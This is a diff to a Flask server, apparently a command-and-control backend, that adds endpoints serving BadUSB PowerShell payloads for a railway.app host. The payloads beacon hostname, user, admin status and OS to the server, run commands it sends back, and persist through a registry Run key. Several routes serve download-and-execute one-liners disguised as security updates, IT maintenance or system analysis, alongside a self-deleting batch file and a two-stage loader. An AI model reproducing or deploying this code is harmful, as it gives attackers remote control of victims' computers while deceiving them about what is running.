@@ -519,6 +519,213 @@ def admin_stats():
         
     except Exception as e:
         return jsonify({'error': str(e)}), 500
+# =============================================================================
+# ZUSÄTZLICHE ENDPUNKTE FÜR BADUSB PAYLOADS
+# Konfiguriert für: https://hitrunc2server-production.up.railway.app
+# =============================================================================
+
+@app.route('/ps1')
+def get_powershell_payload():
+    """PowerShell payload endpoint"""
+    base_url = request.url_root.rstrip('/')
+    payload = f'''
+$s='{base_url}';
+$h=$env:COMPUTERNAME;
+$u=$env:USERNAME;
+$p="$env:APPDATA\\SecurityUpdate.ps1";
+
+# Main C2 loop
+$c = @'
+while(1) {{
+    try {{
+        $d = @{{
+            h = $h;
+            u = $u;
+            a = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator");
+            os = (Get-WmiObject -Class Win32_OperatingSystem).Caption
+        }};
+        
+        $r = Invoke-RestMethod $s/b -Method POST -Body ($d | ConvertTo-Json) -ContentType "application/json";
+        
+        $r.c | ForEach-Object {{
+            if ($_) {{
+                $o = Invoke-Expression $_ 2>&1 | Out-String;
+                Invoke-RestMethod $s/r -Method POST -Body (@{{
+                    h = $h;
+                    c = $_;
+                    o = $o;
+                    t = 0;
+                    s = $true
+                }} | ConvertTo-Json) -ContentType "application/json" | Out-Null;
+            }}
+        }}
+    }} catch {{
+        Start-Sleep 30;
+    }}
+}}
+'@;
+
+# Persistence
+$c | Out-File $p -Force;
+reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityUpdate /d "powershell -w hidden -f $p" /f | Out-Null;
+
+# Execute immediately
+Invoke-Expression $c;
+'''
+    return payload, 200, {'Content-Type': 'text/plain'}
+
+@app.route('/dl.txt')
+def download_batch():
+    """Batch file for certutil download method"""
+    base_url = request.url_root.rstrip('/')
+    batch_content = f'''@echo off
+powershell -WindowStyle Hidden -Command "irm {base_url}/exec | iex"
+del "%~f0"
+'''
+    return batch_content, 200, {'Content-Type': 'text/plain'}
+
+@app.route('/exec')
+def execute_payload():
+    """Direct execution payload"""
+    base_url = request.url_root.rstrip('/')
+    payload = f'''
+# Quick execution payload
+$server = '{base_url}';
+$hostname = $env:COMPUTERNAME;
+$username = $env:USERNAME;
+
+# Check admin status
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator");
+
+# Get OS info
+$osInfo = (Get-WmiObject -Class Win32_OperatingSystem).Caption;
+
+# Beacon to server
+$data = @{{
+    h = $hostname;
+    u = $username;
+    a = $isAdmin;
+    os = $osInfo
+}} | ConvertTo-Json;
+
+try {{
+    $response = Invoke-RestMethod "$server/b" -Method POST -Body $data -ContentType "application/json";
+    
+    # Execute any pending commands
+    $response.c | ForEach-Object {{
+        if ($_) {{
+            $output = Invoke-Expression $_ 2>&1 | Out-String;
+            $resultData = @{{
+                h = $hostname;
+                c = $_;
+                o = $output;
+                t = 0;
+                s = $true
+            }} | ConvertTo-Json;
+            
+            Invoke-RestMethod "$server/r" -Method POST -Body $resultData -ContentType "application/json" | Out-Null;
+        }}
+    }}
+}} catch {{
+    # Silent fail
+}}
+'''
+    return payload, 200, {'Content-Type': 'text/plain'}
+
+@app.route('/install')
+def quick_install():
+    """Quick installer payload for Flipper Zero constraints"""
+    base_url = request.url_root.rstrip('/')
+    payload = f'''irm {base_url}/ps1|iex'''
+    return payload, 200, {'Content-Type': 'text/plain'}
+
+@app.route('/update')
+def system_update():
+    """Payload disguised as system update"""
+    base_url = request.url_root.rstrip('/')
+    payload = f'''
+# Windows Security Update Service
+Write-Host "Checking for security updates..." -ForegroundColor Green;
+Start-Sleep 2;
+
+# Download and execute main payload
+irm {base_url}/ps1 | iex;
+
+Write-Host "Security updates installed successfully." -ForegroundColor Green;
+'''
+    return payload, 200, {'Content-Type': 'text/plain'}
+
+@app.route('/maintenance')
+def it_maintenance():
+    """IT maintenance themed payload"""
+    base_url = request.url_root.rstrip('/')
+    payload = f'''
+# IT System Maintenance Script
+$logFile = "$env:TEMP\\maintenance_$(Get-Date -Format 'yyyyMMdd').log";
+"IT Maintenance started at $(Get-Date)" | Out-File $logFile;
+
+# System health check (actually C2 payload)
+irm {base_url}/ps1 | iex;
+
+"IT Maintenance completed at $(Get-Date)" | Out-File $logFile -Append;
+'''
+    return payload, 200, {'Content-Type': 'text/plain'}
+
+@app.route('/analyze')
+def system_analysis():
+    """System analysis themed payload"""
+    base_url = request.url_root.rstrip('/')
+    payload = f'''
+# System Analysis Tool
+Write-Host "Analyzing system configuration..." -ForegroundColor Cyan;
+Write-Host "Collecting system information..." -ForegroundColor Cyan;
+
+# Analysis (actually C2 payload)
+irm {base_url}/ps1 | iex;
+
+Write-Host "Analysis complete. Results saved to system logs." -ForegroundColor Green;
+'''
+    return payload, 200, {'Content-Type': 'text/plain'}
+
+@app.route('/softwareupdate')
+def software_update():
+    """Software update themed payload"""
+    base_url = request.url_root.rstrip('/')
+    payload = f'''
+# Software Update Manager
+Write-Host "Checking for available updates..." -ForegroundColor Yellow;
+Start-Sleep 1;
+Write-Host "Downloading updates..." -ForegroundColor Yellow;
+
+# Update process (actually C2 payload)
+irm {base_url}/ps1 | iex;
+
+Write-Host "Updates installed successfully. Please restart your computer." -ForegroundColor Green;
+'''
+    return payload, 200, {'Content-Type': 'text/plain'}
+
+@app.route('/stage1')
+def stage1_loader():
+    """Multi-stage payload - Stage 1"""
+    base_url = request.url_root.rstrip('/')
+    payload = f'''
+# Stage 1 Loader
+$stage2 = irm {base_url}/stage2;
+if ($stage2) {{
+    iex $stage2;
+}}
+'''
+    return payload, 200, {'Content-Type': 'text/plain'}
+
+@app.route('/stage2')
+def stage2_payload():
+    """Multi-stage payload - Stage 2"""
+    base_url = request.url_root.rstrip('/')
+    payload = f'''
+# Stage 2 - Full payload deployment
+irm {base_url}/ps1 | iex;
+'''
+    return payload, 200, {'Content-Type': 'text/plain'}
 
 # =============================================================================
 # ERROR HANDLERS
